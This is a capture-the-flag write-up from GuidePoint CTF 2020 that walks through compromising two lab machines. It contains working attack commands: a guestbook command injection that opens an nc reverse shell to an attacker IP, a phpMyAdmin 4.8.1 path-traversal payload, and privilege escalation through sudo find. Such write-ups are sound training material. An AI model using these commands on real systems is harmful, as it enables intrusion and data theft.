# GuidePoint Security CTF 2020

[GuidePoint CTF 2020](https://www.youtube.com/redirect?event=video_description&v=yJF0YPd8lDw&q=https%3A%2F%2Fgo.guidepointsecurity.com%2F2020_11_17_Corp_CaptureTheFlag_Digital_01-Registration-LP.html&redir_token=QUFFLUhqbVVlSTdCOGFwVDF1Z0FTVEU4MGswdWZ5OHNJZ3xBQ3Jtc0ttcjdhR0dld3lkUFJuNHhQQ3lwMEFEYkkycVdfbnlfT0N0ZndzWGFBVGttaExKazJjZm56Z3ktanFGSWdwaExZQ0dya0U4MmFHQ1R6M0pUWlY2alEyVDBTbEg5VG1BOS1uZXdRaGdmZURDNHF3RjB5dw%3D%3D)

## Timeline

Launch: Tuesday, November 17th - 8:00 AM EST
Ends: Monday, November 23rd - 5PM EST
Rank: 10th on Leader board (updated 11/19/2020)


# Belle 1
> May Phan November 17, 2020

## 1 Run nmap

found port80 open

nothing interesting on 10.10.20.3, just one line of html title and header

## Run dibrbuster to look for hidden directory

found phpmyadmin portal > admin,admin didn't work

## run dirbuster to find common file extension
````
dirb http://10.10.20.3/ /usr/share/dirb/wordlists/big.txt -w -X ".asp,.html,.htm,.php,.xml,.jsp"
````

a ha! found http://10.10.20.3/roster.php

## Roster Lookup

Look up Belle?

return 
``
Name: Belle
Role: Princess
"Have your really read every one of these books?"
``
Belle from Beauty and the beast? Rose petal? Books? princess?
Look up Beast
return 
```
"Here's where she meets Prince Charming, but she won't discover that it's him 'til chapter three!"
```
Is there a database? Maybe try running a sql vuln?

## Run sqlmap 

```
dumped to CSV file '/root/.local/share/sqlmap/output/10.10.20.3/dump/castle/Secret.csv'

```

Secret.cvs is large file with a ton of hex characters.. 


translated from hex but a flag is not found

`GMZDGMZTGYZTGMZWGMZTGMBTGYZTIMZWGM2TGMZTGUFDAYJTGYZTMMZTGMYTGMZTG4ZTMMZWGMZT
GMRTGMZTGMZTGMYDGMZTGMZTMMZUGMZTGOJTGMZTCMZTGM4DGMZTGEZTONRUGMYAUNRRGBQQU===
`
it's not base 64

staff.csv has some data

``
name,role,secret,quote
Belle,Princess,daxmaUBr2b.6g,Have you really read every one of these books?
Chip Potts,Son of Mrs. Potts,teSSCPf05DkTQ,"Ha ha! His moustache tickles, momma!"
Cogsworth,Pendulum clock,clN9IWrQ81HUw,"Enchanted? Ha-ha-ha-ha! Who said anything about the castle being enchated? Ha-ha-ha.... It was you, wasn't it?"
Gaston,Hunter,asMuXJnRAPDAM,"You are the wildest, most gorgeous thing I've ever seen! Nobody deserves you..."
Lefou,Gaston's lackey,laGnoRYe87qM2,And his name's G-A-S-T... I believe there's another T... It just occurred to me that I'm illiterate and I've never actually had to spell it out before... 
Luminere,maitre d,cadS49Adb3g76,Be our Guest!
Madame Armoire,Opera Singer,waonbbJgTptGU,AHHHHHHHHH!!!!
Maurice,Father,faBotLT53bVnI,Don't be afraid.
Mrs. Potts,Head of Kitchen,te18RJOS5u/4E,"Oh, stop your grousing. It's been a long night for all of us."
Plumette,Maid,fe0DoZHPoIvYY,A girl! I saw a girl in the castle!
The Beast,Prince,be42ZQu3jcOEo,"No, not all of them. Some of them are in Greek."
``

That " secret"  column looks promising, maybe we can look that up in the secret.csv file

I can trim the file to get only jsut secret

``
daxmaUBr2b.6g
teSSCPf05DkTQ
clN9IWrQ81HUw
asMuXJnRAPDAM
laGnoRYe87qM2
cadS49Adb3g76
waonbbJgTptGU
faBotLT53bVnI
te18RJOS5u/4E
fe0DoZHPoIvYY
be42ZQu3jcOEo
``

these can be hidden dir for each of the "staff"
 maybe use dirbuster again on thes secret to find 

``
---- Scanning URL: http://10.10.20.3/ ----
==> DIRECTORY: http://10.10.20.3/daxmaUBr2b.6g/                                                                      
==> DIRECTORY: http://10.10.20.3/teSSCPf05DkTQ/                                                                      
==> DIRECTORY: http://10.10.20.3/clN9IWrQ81HUw/                                                                      
==> DIRECTORY: http://10.10.20.3/asMuXJnRAPDAM/                                                                      
==> DIRECTORY: http://10.10.20.3/laGnoRYe87qM2/                                                                      
==> DIRECTORY: http://10.10.20.3/cadS49Adb3g76/                                                                      
==> DIRECTORY: http://10.10.20.3/waonbbJgTptGU/                                                                      
==> DIRECTORY: http://10.10.20.3/faBotLT53bVnI/                                                                      
==> DIRECTORY: http://10.10.20.3/te18RJOS5u/4E/                                                                      
==> DIRECTORY: http://10.10.20.3/fe0DoZHPoIvYY/                                                                      
==> DIRECTORY: http://10.10.20.3/be42ZQu3jcOEo/ 
``


this one timed out. what does it mean

``
---- Entering directory: http://10.10.20.3/cadS49Adb3g76/ ----                                                                             
(!) FATAL: Too many errors connecting to host
    (Possible cause: OPERATION TIMEOUT)
``

ok let's navigate to that

it's a guestbook
view source shows POST method with input 
we cam get a shell from that 


`
root@kali:/home/may# curl -X POST http://10.10.20.3/cadS49Adb3g76/ -d "input_name=a;system('/bin/nc.traditional -nv 10.10.0.77 4444 -e /bin/bash')&input_text=b&Submit=submit"
`

got a shell!! Found flag.txt 

`
flag2{cc46091749e55f33fe4046b9c8855a13}
`

escate priviledge

`
find / -user root -perm -4000 -exec ls -ldb {} \;
`

`
cat /home/public/flag.txt
flag3{ee195d0d8ee3e759f300116f0829468b}
cat /root/flag.txt
flag4{0fe769de0194b20822e561a57864ac48}
That's it.
`






# Jeffrey

> May Phan November 18 2020

view source found first flag: 

StormCTF{Learners:Net:Jeffrey1:6d9e2b41A7a421BE92d7cB23B850FD50}

# Nmap 

`
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 76:14:8f:cf:6a:49:bd:d3:ca:ec:9a:d7:6c:f8:7a:d5 (RSA)
|   256 2d:4f:86:b2:39:5d:45:6f:10:35:46:51:a7:e2:ae:17 (ECDSA)
|_  256 ea:3b:08:57:35:c0:75:af:70:b0:82:e1:82:11:bf:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                      
|_http-title: Jeffrey
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
`

allports

`
58008/tcp open  unknown
`

# Dirbuster

found /wordpress

when nagivating to 10.10.20.2/wordpress, clicked on liknks and got redirected to http://jeffrey.storm.ctf/. Ping unresponsive

Found phpadmin
logged in with admin:password 
found second flag

StormCTF{Learners:Net:Jeffrey2:faD3c1dB5d6F167c0C7BFd8f24af76Ee} 


another clue: 

Aldus, quit using the admin account. We removed the permissions. We saved your password at /var/www/aldus.txt

# PHP vuln

Let's check metasploit if this version of phpadmin has a vulnerable

phpadmin 4.8.1 does have a Local File vuln. we can climb up the file tree to get the txt file

found this on the exploidb website

Payload:

http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../windows/wininit.ini

 we can use this to jeffery
`
http://10.10.20.2/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../var/www/aldus.txt
`
 found password
 Aldus, this is a really insecure way to store your password, so we encoded it so that no one can ever get it without knowing how to decode it!!! Your encoded password is: ZzN0X2hpbV8ydGgzLUdyM2VLCg==

 looks like a base64. google a decoder

 got password

 `
g3t_him_2th3-Gr3eK

 `

Where can I use this

there was another open port 58008

`
http://10.10.20.2:58008/
`
got it! logged in with aldus : g3t_him_2th3-Gr3eK


found the flag!!1

StormCTF{Learners:Net:Jeffrey3:ca2cBDD70aA9029d1bad2Cb527C18529}


last flag

priviledge escalation

`
sudo -l
`

seems like aldus run find, we might just be able to find flag.txt in root
`
User aldus may run the following commands on jeffrey.storm.ctf:
    (ALL) NOPASSWD: /usr/bin/find
`
`
sudo find . -exec cat flag.txt \
`

ah ha found the flag

StormCTF{Learners:Net:Jeffrey4:e4B6f1661bBE654Ba901CbC3Be377E89}
